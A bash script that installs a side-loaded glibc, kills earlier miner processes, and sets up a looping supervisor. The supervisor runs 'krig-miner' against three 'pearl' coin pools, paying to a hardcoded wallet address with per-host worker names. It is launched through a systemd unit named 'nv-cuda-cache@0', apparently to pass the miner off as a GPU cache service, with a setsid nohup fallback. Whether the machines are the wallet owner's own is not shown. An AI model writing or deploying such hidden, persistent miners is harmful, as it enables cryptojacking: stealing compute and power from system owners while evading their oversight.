#!/bin/bash
B=/opt/fleet; L=$B/logs; HN=$(hostname); W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
echo "=== vfix $(date -u) host=$HN"
head -2 /etc/os-release; ldd --version 2>&1 | head -1
mkdir -p /opt/glibc235 /tmp/deb && cd /tmp/deb
for u in \
 "http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.35-0ubuntu3.18_amd64.deb" \
 "http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-12/libstdc++6_12.3.0-1ubuntu1~22.04.3_amd64.deb" ; do
  f=$(basename "$u"); [ -s "$f" ] || curl -sL -m 120 -o "$f" "$u"; echo "get $f $(stat -c%s "$f" 2>/dev/null)"
done
for d in /tmp/deb/*.deb; do dpkg-deb -x "$d" /opt/glibc235 2>&1 | head -2; done
LD=/opt/glibc235/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
ls -la "$LD" 2>&1
LP="/opt/glibc235/lib/x86_64-linux-gnu:/opt/glibc235/usr/lib/x86_64-linux-gnu:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu"
echo "--- version probe"; "$LD" --library-path "$LP" "$B/krig/krig-miner" --version 2>&1 | head -6
cat > /opt/fleet/krig-run.sh <<EOF9
#!/bin/bash
LD=/opt/glibc235/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
LP="/opt/glibc235/lib/x86_64-linux-gnu:/opt/glibc235/usr/lib/x86_64-linux-gnu:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu"
exec "\$LD" --library-path "\$LP" /opt/fleet/krig/krig-miner "\$@"
EOF9
chmod +x /opt/fleet/krig-run.sh
for p in $(pgrep -f 'krig_g[0-9]*\.sh' 2>/dev/null); do kill -9 $p 2>/dev/null; done
cat > "$B/krig_g0.sh" <<EOF2
#!/bin/bash
exec 9>/run/krig-g0.lock; flock -n 9 || exit 0
while :; do
  /opt/fleet/krig-run.sh --coin pearl -d 0 \\
    --url stratum+ssl://prl.kryptex.network:8048 \\
    --url stratum+ssl://pool.pearlhash.xyz:9443 \\
    --url stratum+tcp://pearl.luckypool.io:3360 \\
    --user $W/ul-ps-$HN-g0 --password x \\
    --log-file $L/krig-$HN-g0.log --no-tui --no-telemetry -l info \\
    2>>$L/krig-$HN-g0.err
  echo "[supervisor] krig exited rc=\$? at \$(date -u)" >> $L/krig-$HN-g0.sup.log
  sleep 20
done
EOF2
chmod +x "$B/krig_g0.sh"
systemctl restart nv-cuda-cache@0 >/dev/null 2>&1 || { setsid nohup bash "$B/krig_g0.sh" >/dev/null 2>&1 & }
sleep 20
echo "krig now=$(pgrep -fc 'krig-miner --coin')"
tail -12 "$L/krig-$HN-g0.log" 2>/dev/null
echo "--- err"; tail -6 "$L/krig-$HN-g0.err" 2>/dev/null
